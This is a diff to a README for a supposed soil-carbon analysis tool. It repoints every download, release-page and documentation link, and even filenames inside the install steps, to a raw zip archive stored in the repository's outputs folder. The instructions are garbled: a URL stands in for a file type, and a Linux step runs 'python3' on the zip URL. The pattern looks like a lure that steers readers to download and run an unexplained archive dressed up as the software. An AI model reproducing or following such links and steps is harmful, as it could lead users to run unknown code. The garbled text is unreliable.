@@ -6,11 +6,11 @@ Welcome to the **soil-carbon-proxy-mrv** project! This tool helps you analyze ve
 
 ## 📥 Download the Application
 
-[![Download Now](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip%20Now-Soil%20Carbon%20Proxy%https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip)](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip)
+[![Download Now](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip%20Now-Soil%20Carbon%20Proxy%https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip)](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip)
 
 To get started, please visit the Releases page to download the software:
 
-[Download from Releases Page](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip)
+[Download from Releases Page](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip)
 
 ## 💻 System Requirements
 
@@ -35,9 +35,9 @@ This application allows you to:
 
 To download the software, follow these steps:
 
-1. Click the link to visit the Releases page: [Download from Releases Page](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip).
+1. Click the link to visit the Releases page: [Download from Releases Page](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip).
 2. Find the latest release version.
-3. Choose the correct file for your operating system. For example, it could be a `.exe`, `.dmg`, or `https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip` file.
+3. Choose the correct file for your operating system. For example, it could be a `.exe`, `.dmg`, or `https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip` file.
 4. Click on the file to start the download.
 
 After downloading, follow these steps to install:
@@ -51,8 +51,8 @@ After downloading, follow these steps to install:
 2. Drag the app to your Applications folder.
 
 ### For Linux:
-1. Extract the downloaded `https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip` file.
-2. Open a terminal, navigate to the extracted folder, and use the command `python3 https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip install` to install.
+1. Extract the downloaded `https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip` file.
+2. Open a terminal, navigate to the extracted folder, and use the command `python3 https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip install` to install.
 
 ## 🗂️ Using the Application
 
@@ -70,7 +70,7 @@ Your analysis will provide you with important insights into cropland health, use
 
 Detailed documentation is available to help you maximize your use of this tool. You can find guides, troubleshooting tips, and more on the GitHub page:
 
-[Documentation](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/figures/carbon-proxy-mrv-soil-v1.3.zip)
+[Documentation](https://github.com/atifrehan7/soil-carbon-proxy-mrv/raw/refs/heads/main/outputs/mrv-carbon-proxy-soil-2.0.zip)
 
 ## 🤝 Contributing
 
